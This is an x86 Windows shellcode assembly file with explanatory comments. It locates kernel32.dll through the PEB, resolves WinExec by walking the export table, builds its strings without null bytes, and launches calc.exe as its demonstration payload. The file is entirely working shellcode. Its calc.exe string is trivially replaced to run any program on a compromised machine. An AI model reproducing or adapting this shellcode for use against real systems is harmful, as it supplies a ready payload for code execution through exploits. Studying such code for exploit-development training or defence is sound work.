[BITS 32]

start:
    push eax                        ; store relevant registers
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp
    
    push ebp                        ; new stack frame
    mov ebp, esp
    sub esp, 18h                    ; local vars space on stack
    
    xor esi, esi
    mov esi, 0x01646679
    sub esi, 0x01010101
    push esi
    push 456e6957h
    mov [ebp - 4], esp                ; store function name "WinExec\x00"
    
    ; get kernel32.dll base address
    xor esi, esi
    mov ebx, [fs:30h + esi]         ; avoids nulls
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x14]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x10]           ; ebx holds kernel32.dll base address
    mov [ebp - 8], ebx              ; store kernel32.dll base address
    
    mov eax, [ebx + 3ch]            ; base address + 0x3c -> RVA 
    add eax, ebx                        ; base address + RVA -> PE signature
    mov eax, [eax + 78h]                ; PE signature + 0x78 -> RVA of export table
    add eax, ebx                        ; base address + RVA of export table -> address of export table
    mov ecx, [eax + 24h]                ; export table + 0x24 -> RVA of ordinal table
    add ecx, ebx                        ; base address + RVA of ordinal table -> address of ordinal table
    mov [ebp-0Ch], ecx                  ; store addr of ordinal table
    mov edi, [eax + 20h]                ; export table + 0x20 -> RVA of name pointer table
    add edi, ebx                        ; base address + RVA of name pointer table -> address of name pointer table
    mov [ebp-10h], edi                  ; store addr of name pointer table
    mov edx, [eax + 1Ch]                ; export table + 0x1c -> RVA of address table
    add edx, ebx                        ; base address + RVA of address table -> address of address table
    mov [ebp-14h], edx                  ; store addr of address table
    mov edx, [eax + 14h]                ; Export Table + 0x14  -> number of functions that the DLL exports
    xor eax, eax                        ; counter = 0

.loop:
    mov edi, [ebp - 10h]            ; address of name pointer table
    mov esi, [ebp - 4h]             ; string of function name to search for ("WinExec\x00")
    xor ecx, ecx
    
    cld                             ; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]          ; name pointer table entries are 4 bytes
    
    add edi, ebx                    ; base address + RVA nth entry -> address of string
    add cx, 8                       ; length of strings to compare (this should be length of the string you're looking for)
    repe cmpsb
                                    ; compares esi and edi.  ZF=1 if equal, ZF=0 if not
    jz start.found
    
    inc eax
    cmp eax, edx                    ; edx = num of functions exported.. check if we've reached the end
    jb start.loop
    
    add esp, 26h
    jmp start.end                   ; function not found

.found:
    ; eax holds position of our string..
    mov ecx, [ebp - 0Ch]            ; address of ordinal table
    mov edx, [ebp - 14h]            ; address of address table
    
    mov ax, [ecx + eax*2]           ; ordinal number
    mov eax, [edx + eax*4]          ; RVA of function
    add eax, ebx                    ; address of function = kernel32.dll base address + RVA of function
    
xor edx, edx
push edx
push 6578652eh                      ; push exe.
push 636c6163h                      ; push clac
push 5c32336dh                      ; push \23m
push 65747379h                      ; push etsy
push 535c7377h                      ; push S\sw
push 6f646e69h                      ; push odni
push 575c3a43h                      ; push W\:C
mov esi, esp                        ; esi -> "C:\Windows\System32\calc.exe"

push 10                             ; window state SW_SHOWDEFAULT
push esi
call eax

add esp, 46h                        ; clear the stack

.end:
    pop ebp
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop eax
    ret
